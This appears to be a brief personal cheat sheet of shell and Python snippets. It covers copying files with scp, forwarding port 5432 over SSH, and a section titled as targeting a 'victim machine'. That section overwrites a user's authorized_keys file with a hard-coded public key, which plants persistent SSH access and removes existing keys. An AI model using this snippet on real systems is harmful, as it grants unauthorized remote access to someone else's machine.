## shh vectim machine
```
with open('/home/low/.ssh/authorized_keys','w+') as f :
        f.writelines('ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC61N/KrZJoYD8pTue4Y6crUVfFngYhST+DLnypSuOd97DtzbC6xsmsa+ezNdM3Q6ioNCc/C2gCP/4HXc3mVOlvA1iZVNbvZ9Gi0AwCziI9HLKDoOZN7EG+3Gnp72BdnmKKHDXnObXGG+EibrN7kqrLoxzGoIqrKF6iAJjfn4NfM7qsyIfb2UAAd0XaUnmFmfy9P1CJvn0p7dbaWvlEAZyHqOAoXmIN3teHb73Wj5FITPQW1MHj+WWcXdt+Cmn1A9xcOwE5saFwmzYCC9QfyieBWpjLvy5iUQZN7l1JNRvPoUJ10mBB2nfKBtY03xXbtemxXjTPf1jPEyt4K9ori9hTEmJzB7e2XOQJLvAblW4qLWCP8uwVEf7sY5xmj/s0PhlCcutVR7U4R3dcwIkeSb/SBU4h/mxRDRJgFUrzNVZW04VCgCG56+P5Wf49VAgRhFIoMndPkjkszZ5NMQi4Kg2ljlqWidzpru3KNsHdP9CqSkyuc2y/W9Z1QgUwr5DfdEU=')
```

## Copy Files
```
scp -r /home/gtc/Documents/GTC/R/Dashboard_gasoil  atelier@192.168.1.250:/home/atelier/R
```

##  Port Forwarding in Linux
```
ssh -f -N atelier@192.168.1.250 -L 5432:localhost:5432
```
